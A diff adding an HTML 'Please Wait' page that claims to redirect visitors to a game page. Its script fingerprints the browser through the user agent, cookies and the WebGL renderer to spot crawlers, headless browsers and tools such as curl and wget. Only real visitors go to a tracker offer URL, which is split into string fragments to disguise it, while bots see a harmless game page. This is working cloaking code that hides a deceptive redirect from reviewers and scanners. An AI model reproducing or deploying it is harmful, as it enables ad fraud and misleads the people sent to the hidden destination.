@@ -1,0 +1,142 @@
+<html>
+<head>
+<title>Please Wait...</title>
+<script>	
+	function getParams() {
+	var tmp = new Array();		// два вспомагательных
+	var tmp2 = new Array();		// массива
+	var param = new Array();
+
+	var get = location.search;	// строка GET запроса
+	if(get != '') {
+		tmp = (get.substr(1)).split('&');	// разделяем переменные
+		for(var i=0; i < tmp.length; i++) {
+			tmp2 = tmp[i].split('=');		// массив param будет содержать
+			param[tmp2[0]] = tmp2[1];		// пары ключ(имя переменной)->значение
+		}
+	} else return false;
+	return param;
+}
+var param = getParams();
+var url = param['url'];
+var utm_term = param['utm_term'];
+</script>
+</head>
+<body bgcolor="#ffffff">
+
+<!-- ss JavaScript
+    ================================================== -->
+	<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
+	
+<center>
+<img src="spinner.gif">
+<h2>Please wait <span id="rocket">3</span> seconds to be automatically redirected to the Game Page<br/></h2>
+
+<script>
+let timer; // пока пустая переменная
+let x =3; // стартовое значение обратного отсчета
+countdown(); // вызов функции
+function countdown(){  // функция обратного отсчета
+    document.getElementById('rocket').innerHTML = x;
+    x--; // уменьшаем число на единицу
+    if (x<0){
+        clearTimeout(timer); // таймер остановится на нуле
+    
+    }
+    else {
+        timer = setTimeout(countdown, 1000);
+    }
+}
+	
+	var useragent=navigator.userAgent;
+	var myuseragent1 = btoa(useragent);
+	var myuseragent2 = Cookies.get('u');
+	var myuseragent3 = Cookies.get('w');
+	
+	var canvas = document.createElement('canvas');
+	var gl;
+	var debugInfo;
+	var vendor;
+	var renderer;
+
+	try {
+	  gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+	} catch (e) {
+	}
+
+	if (gl) {
+	  debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+	  vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+	  renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+	}
+
+	console.log(renderer);
+	renderer = renderer.toLowerCase();
+
+	var myrenderer = 1;
+	if (-1 < (pos = renderer.indexOf('swiftshader'))) {
+		var myrenderer = 0;
+	}
+	if (-1 < (pos = renderer.indexOf('google'))) {
+		var myrenderer = 0;
+	}
+	if (-1 < (pos = renderer.indexOf('basic'))) {
+		var myrenderer = 0;
+	}
+	if (-1 < (pos = renderer.indexOf('render'))) {
+		var myrenderer = 0;
+	}	if (-1 < (pos = renderer.indexOf('driver'))) {
+		var myrenderer = 0;
+	}
+	if (-1 < (pos = renderer.indexOf('shader'))) {
+		var myrenderer = 0;
+	}
+	if (-1 < (pos = renderer.indexOf('swift'))) {
+		var myrenderer = 0;
+	}
+	if (-1 < (pos = renderer.indexOf('source'))) {
+		var myrenderer = 0;
+	}	
+	
+	var myuseragent = 1;
+	useragent = useragent.toLowerCase();
+	if (-1 < (pos = useragent.indexOf('bot'))) {
+		var myuseragent = 0;
+	}
+	if (-1 < (pos = useragent.indexOf('cros'))) {
+		var myuseragent = 0;
+	}
+	if (-1 < (pos = useragent.indexOf('adwords'))) {
+		var myuseragent = 0;
+	}
+	if (-1 < (pos = useragent.indexOf('spider'))) {
+		var myuseragent = 0;
+	}
+	if (-1 < (pos = useragent.indexOf('curl'))) {
+		var myuseragent = 0;
+	}
+	if (-1 < (pos = useragent.indexOf('wget'))) {
+		var myuseragent = 0;
+	}	
+	
+	if ((myuseragent1==myuseragent2) && (myuseragent1==myuseragent3) && (myrenderer==1) && (myuseragent==1)) {
+		var url = 'http://'+'tr'+'ck.'+'ap'+'plsy'+'.xy'+'z/c'+'lick?pid'+'=2'+'6'+'&off'+'er_id=1'+'7'+'8'+'&sub'+'2=013'+'G&sub3='+utm_term;
+		setTimeout( 'location="' + url + '";', 1000 );
+	} else {
+		var url = "game.html";
+		setTimeout( 'location="' + url + '";', 3000 );
+	};	
+	
+	Cookies.remove('u');
+	Cookies.remove('w');
+	
+</script>
+</center>
+  &nbsp;
+</body>
+</html>
+
+
